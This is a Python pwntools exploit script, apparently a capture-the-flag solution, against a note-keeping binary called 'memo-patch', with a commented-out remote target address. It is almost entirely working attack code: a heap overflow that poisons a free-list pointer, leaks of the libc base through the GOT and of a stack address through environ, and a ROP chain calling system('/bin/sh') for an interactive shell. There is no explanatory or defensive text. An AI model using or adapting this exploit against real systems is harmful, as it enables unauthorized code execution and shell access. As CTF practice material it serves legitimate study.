#!/usr/bin/env python
# -*- coding: utf8 -*-
from pwn import * # pip install pwntools
import sys

reip = '54.202.7.144'
report = 8888

r = process('./memo-patch')
#r = remote(reip, report)

# Setup name & pw
r.recvuntil("What's user name:")
r.sendline('nae')
r.recvuntil('Do you wanna set password? (y/n)')
r.sendline('y')
r.recvuntil('Password:')
r.sendline('A'*24 + p64(0x30))

def leave(idx, length, payload, overflow=False):
    r.recvuntil('>>')
    r.sendline('1')
    r.recvuntil('Index:')
    r.sendline(str(idx))
    r.recvuntil('Length:')
    r.sendline(str(length))
    if not overflow:
        r.recvuntil('Message:')
    else:
        r.recvuntil('message too long, you can leave on memo though')
    r.sendline(payload)

def delete(idx):
    r.recvuntil('>>')
    r.sendline('4')
    r.recvuntil('Index:')
    r.sendline(str(idx))

def view(idx):
    r.recvuntil('>>')
    r.sendline('3')
    r.recvuntil('Index:')
    r.sendline(str(idx))

def edit(payload):
    r.recvuntil('>>')
    r.sendline('2')
    r.recvuntil('Edit message:')
    r.send(payload)

global_size = 0x602a60
libc_start_main_got = 0x601fb0
libc = ELF('bc.so.6')


leave(0, 32, 'A'*8)
leave(1, 32, 'B'*8)

# Overflow
delete(1)
delete(0)
payload = ('A'*32 + p64(0) + p64(0x31) + # Restore chunk struct
        p64(global_size-0x10))           # Fake fd
leave(0, 400, payload, True)
leave(0, 32, 'A'*4)                      # malloc garbage
fix_size_payload = '\xf0'.ljust(4, '\x00')*4
payload = fix_size_payload + p64(libc_start_main_got)
leave(3, 32, payload)                    # Get the chunk in global

# Leak libc base
view(0)
r.recvuntil('View Message: ')
base = u64(r.recvline()[:-1] + '\x00'*2) - libc.symbols['__libc_start_main']
log.success('base : {}'.format(hex(base)))

# Leak stack address
payload = fix_size_payload + p64(base + libc.symbols['environ'])
edit(payload)
view(0)
r.recvuntil('View Message: ')
stack = u64(r.recvline()[:-1] + '\x00'*2) - 0xf0
log.success('stack : {}'.format(hex(stack)))

# Exploit
payload = fix_size_payload + 'A'*24 + p64(stack)
edit(payload)
sh = base + next(libc.search('/bin/sh\x00'))
system = base + libc.symbols['system']
pop_rdi =  base + 0x0000000000021102
payload = p64(pop_rdi) + p64(sh) + p64(system)
edit(payload)

# Return to ROP
r.recvuntil('>>')
r.sendline('6')

r.interactive()
